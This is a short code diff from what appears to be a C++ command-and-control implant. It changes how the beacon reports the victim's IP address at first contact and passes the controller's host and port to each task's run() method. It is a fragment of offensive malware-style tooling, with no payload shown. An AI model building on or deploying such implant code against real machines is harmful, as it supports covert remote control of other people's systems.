@@ -175,6 +175,7 @@ void Implant::beacon() {
     // Format result contents
     std::stringstream resultsStringStream;
     resultsLocal.add("agent_id", agent_id);
+    // Only runs during initialization
     if (agent_id == "MA==") {
         resultsLocal.add("ip_address", getIPAddr());
     }
@@ -228,7 +229,7 @@ void Implant::serviceTasks() {
         // Range based for-loop to call the run() method on each task and add the results of tasks
         for (const auto& task : localTasks) {
             // Call run() on each task and we'll get back values for id, contents and success
-            const auto [id, agent_id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
+            const auto [id, agent_id, contents, success] = std::visit([this](const auto& task) {return task.run(host,port); }, task);
             // Scoped lock to add task results
             {
                 std::scoped_lock<std::mutex> resultsLock{ resultsMutex };
